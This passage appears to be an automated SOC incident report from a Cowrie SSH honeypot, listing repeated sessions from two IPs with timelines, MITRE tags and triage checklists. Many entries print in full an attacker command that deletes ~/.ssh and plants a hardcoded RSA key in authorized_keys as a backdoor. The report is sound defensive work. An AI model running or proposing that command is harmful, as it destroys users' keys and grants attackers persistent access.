| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:51:59` | `cowrie.session.connect` |
| `2026-04-10 15:51:59` | `cowrie.client.version` |
| `2026-04-10 15:51:59` | `cowrie.client.kex` |
| `2026-04-10 15:52:00` | `cowrie.login.success` |
| `2026-04-10 15:52:00` | `cowrie.session.params` |
| `2026-04-10 15:52:00` | `cowrie.command.input` |
| `2026-04-10 15:52:00` | `cowrie.command.failed` |
| `2026-04-10 15:52:00` | `cowrie.log.closed` |
| `2026-04-10 15:52:00` | `cowrie.session.params` |
| `2026-04-10 15:52:00` | `cowrie.command.input` |
| `2026-04-10 15:52:00` | `cowrie.session.file_download` |
| `2026-04-10 15:52:00` | `cowrie.log.closed` |
| `2026-04-10 15:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f33364c72eb4

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:52 |
| **Last Seen** | 2026-04-10 15:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:52:02` | `cowrie.session.connect` |
| `2026-04-10 15:52:02` | `cowrie.client.version` |
| `2026-04-10 15:52:02` | `cowrie.client.kex` |
| `2026-04-10 15:52:02` | `cowrie.login.success` |
| `2026-04-10 15:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48512807cf9

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:53 |
| **Last Seen** | 2026-04-10 15:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:53:45` | `cowrie.session.connect` |
| `2026-04-10 15:53:45` | `cowrie.client.version` |
| `2026-04-10 15:53:45` | `cowrie.client.kex` |
| `2026-04-10 15:53:46` | `cowrie.login.success` |
| `2026-04-10 15:53:46` | `cowrie.session.params` |
| `2026-04-10 15:53:46` | `cowrie.command.input` |
| `2026-04-10 15:53:46` | `cowrie.command.failed` |
| `2026-04-10 15:53:46` | `cowrie.log.closed` |
| `2026-04-10 15:53:46` | `cowrie.session.params` |
| `2026-04-10 15:53:46` | `cowrie.command.input` |
| `2026-04-10 15:53:46` | `cowrie.session.file_download` |
| `2026-04-10 15:53:46` | `cowrie.log.closed` |
| `2026-04-10 15:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cdfae33802

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:53 |
| **Last Seen** | 2026-04-10 15:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:53:46` | `cowrie.session.connect` |
| `2026-04-10 15:53:46` | `cowrie.client.version` |
| `2026-04-10 15:53:46` | `cowrie.client.kex` |
| `2026-04-10 15:53:47` | `cowrie.login.success` |
| `2026-04-10 15:53:48` | `cowrie.session.params` |
| `2026-04-10 15:53:48` | `cowrie.command.input` |
| `2026-04-10 15:53:48` | `cowrie.command.failed` |
| `2026-04-10 15:53:48` | `cowrie.log.closed` |
| `2026-04-10 15:53:49` | `cowrie.session.params` |
| `2026-04-10 15:53:49` | `cowrie.command.input` |
| `2026-04-10 15:53:49` | `cowrie.session.file_download` |
| `2026-04-10 15:53:49` | `cowrie.log.closed` |
| `2026-04-10 15:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61cf3d493c7b

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:53 |
| **Last Seen** | 2026-04-10 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:53:48` | `cowrie.session.connect` |
| `2026-04-10 15:53:48` | `cowrie.client.version` |
| `2026-04-10 15:53:48` | `cowrie.client.kex` |
| `2026-04-10 15:53:48` | `cowrie.login.success` |
| `2026-04-10 15:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871bba9f3a23

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:53 |
| **Last Seen** | 2026-04-10 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:53:53` | `cowrie.session.connect` |
| `2026-04-10 15:53:53` | `cowrie.client.version` |
| `2026-04-10 15:53:53` | `cowrie.client.kex` |
| `2026-04-10 15:53:55` | `cowrie.login.success` |
| `2026-04-10 15:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015413417773

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:55 |
| **Last Seen** | 2026-04-10 15:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:55:28` | `cowrie.session.connect` |
| `2026-04-10 15:55:28` | `cowrie.client.version` |
| `2026-04-10 15:55:28` | `cowrie.client.kex` |
| `2026-04-10 15:55:29` | `cowrie.login.success` |
| `2026-04-10 15:55:29` | `cowrie.session.params` |
| `2026-04-10 15:55:29` | `cowrie.command.input` |
| `2026-04-10 15:55:29` | `cowrie.command.failed` |
| `2026-04-10 15:55:29` | `cowrie.log.closed` |
| `2026-04-10 15:55:29` | `cowrie.session.params` |
| `2026-04-10 15:55:29` | `cowrie.command.input` |
| `2026-04-10 15:55:29` | `cowrie.session.file_download` |
| `2026-04-10 15:55:29` | `cowrie.log.closed` |
| `2026-04-10 15:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca583c5cf11d

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:55 |
| **Last Seen** | 2026-04-10 15:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:55:31` | `cowrie.session.connect` |
| `2026-04-10 15:55:31` | `cowrie.client.version` |
| `2026-04-10 15:55:31` | `cowrie.client.kex` |
| `2026-04-10 15:55:31` | `cowrie.login.success` |
| `2026-04-10 15:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b28feee108

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:57 |
| **Last Seen** | 2026-04-10 15:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:57:01` | `cowrie.session.connect` |
| `2026-04-10 15:57:01` | `cowrie.client.version` |
| `2026-04-10 15:57:01` | `cowrie.client.kex` |
| `2026-04-10 15:57:02` | `cowrie.login.success` |
| `2026-04-10 15:57:03` | `cowrie.session.params` |
| `2026-04-10 15:57:03` | `cowrie.command.input` |
| `2026-04-10 15:57:03` | `cowrie.command.failed` |
| `2026-04-10 15:57:03` | `cowrie.log.closed` |
| `2026-04-10 15:57:04` | `cowrie.session.params` |
| `2026-04-10 15:57:04` | `cowrie.command.input` |
| `2026-04-10 15:57:04` | `cowrie.session.file_download` |
| `2026-04-10 15:57:04` | `cowrie.log.closed` |
| `2026-04-10 15:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239167da7a7c

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:57 |
| **Last Seen** | 2026-04-10 15:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:57:06` | `cowrie.session.connect` |
| `2026-04-10 15:57:06` | `cowrie.client.version` |
| `2026-04-10 15:57:06` | `cowrie.client.kex` |
| `2026-04-10 15:57:06` | `cowrie.login.success` |
| `2026-04-10 15:57:06` | `cowrie.session.params` |
| `2026-04-10 15:57:06` | `cowrie.command.input` |
| `2026-04-10 15:57:06` | `cowrie.command.failed` |
| `2026-04-10 15:57:06` | `cowrie.log.closed` |
| `2026-04-10 15:57:06` | `cowrie.session.params` |
| `2026-04-10 15:57:06` | `cowrie.command.input` |
| `2026-04-10 15:57:07` | `cowrie.session.file_download` |
| `2026-04-10 15:57:07` | `cowrie.log.closed` |
| `2026-04-10 15:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7835485d35e0

| Field | Detail |
|---|---|
| **Source IP** | `187.107.88[.]97` |
| **First Seen** | 2026-04-10 15:57 |
| **Last Seen** | 2026-04-10 15:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:57:08` | `cowrie.session.connect` |
| `2026-04-10 15:57:08` | `cowrie.client.version` |
| `2026-04-10 15:57:08` | `cowrie.client.kex` |
| `2026-04-10 15:57:10` | `cowrie.login.success` |
| `2026-04-10 15:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.107.88[.]97` to AbuseIPDB if not already reported
- [ ] Block `187.107.88[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a178f49d221

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 15:57 |
| **Last Seen** | 2026-04-10 15:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:57:08` | `cowrie.session.connect` |
| `2026-04-10 15:57:08` | `cowrie.client.version` |
| `2026-04-10 15:57:08` | `cowrie.client.kex` |
| `2026-04-10 15:57:08` | `cowrie.login.success` |
| `2026-04-10 15:57:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc819785a7d8

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:00 |
| **Last Seen** | 2026-04-10 16:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:00:36` | `cowrie.session.connect` |
| `2026-04-10 16:00:36` | `cowrie.client.version` |
| `2026-04-10 16:00:36` | `cowrie.client.kex` |
| `2026-04-10 16:00:36` | `cowrie.login.success` |
| `2026-04-10 16:00:36` | `cowrie.session.params` |
| `2026-04-10 16:00:36` | `cowrie.command.input` |
| `2026-04-10 16:00:36` | `cowrie.command.failed` |
| `2026-04-10 16:00:36` | `cowrie.log.closed` |
| `2026-04-10 16:00:37` | `cowrie.session.params` |
| `2026-04-10 16:00:37` | `cowrie.command.input` |
| `2026-04-10 16:00:37` | `cowrie.session.file_download` |
| `2026-04-10 16:00:37` | `cowrie.log.closed` |
| `2026-04-10 16:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ec9bd2ba1f

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:00 |
| **Last Seen** | 2026-04-10 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:00:38` | `cowrie.session.connect` |
| `2026-04-10 16:00:38` | `cowrie.client.version` |
| `2026-04-10 16:00:38` | `cowrie.client.kex` |
| `2026-04-10 16:00:39` | `cowrie.login.success` |
| `2026-04-10 16:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e03656042a

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:09 |
| **Last Seen** | 2026-04-10 16:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:09:06` | `cowrie.session.connect` |
| `2026-04-10 16:09:06` | `cowrie.client.version` |
| `2026-04-10 16:09:06` | `cowrie.client.kex` |
| `2026-04-10 16:09:06` | `cowrie.login.success` |
| `2026-04-10 16:09:06` | `cowrie.session.params` |
| `2026-04-10 16:09:06` | `cowrie.command.input` |
| `2026-04-10 16:09:06` | `cowrie.command.failed` |
| `2026-04-10 16:09:06` | `cowrie.log.closed` |
| `2026-04-10 16:09:06` | `cowrie.session.params` |
| `2026-04-10 16:09:06` | `cowrie.command.input` |
| `2026-04-10 16:09:06` | `cowrie.session.file_download` |
| `2026-04-10 16:09:06` | `cowrie.log.closed` |
| `2026-04-10 16:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd449e94f993

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:09 |
| **Last Seen** | 2026-04-10 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:09:08` | `cowrie.session.connect` |
| `2026-04-10 16:09:08` | `cowrie.client.version` |
| `2026-04-10 16:09:08` | `cowrie.client.kex` |
| `2026-04-10 16:09:08` | `cowrie.login.success` |
| `2026-04-10 16:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.71[.]43` to AbuseIPDB if not already reported
- [ ] Block `43.156.71[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301773f07405

| Field | Detail |
|---|---|
| **Source IP** | `43.156.71[.]43` |
| **First Seen** | 2026-04-10 16:10 |
| **Last Seen** | 2026-04-10 16:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 16:10:48` | `cowrie.session.connect` |
| `2026-04-10 16:10:48` | `cowrie.client.version` |
| `2026-04-10 16:10:48` | `cowrie.client.kex` |
| `2026-04-10 16:10:48` | `cowrie.login.success` |
| `2026-04-10 16:10:48` | `cowrie.session.params` |
| `2026-04-10 16:10:48` | `cowrie.command.input` |
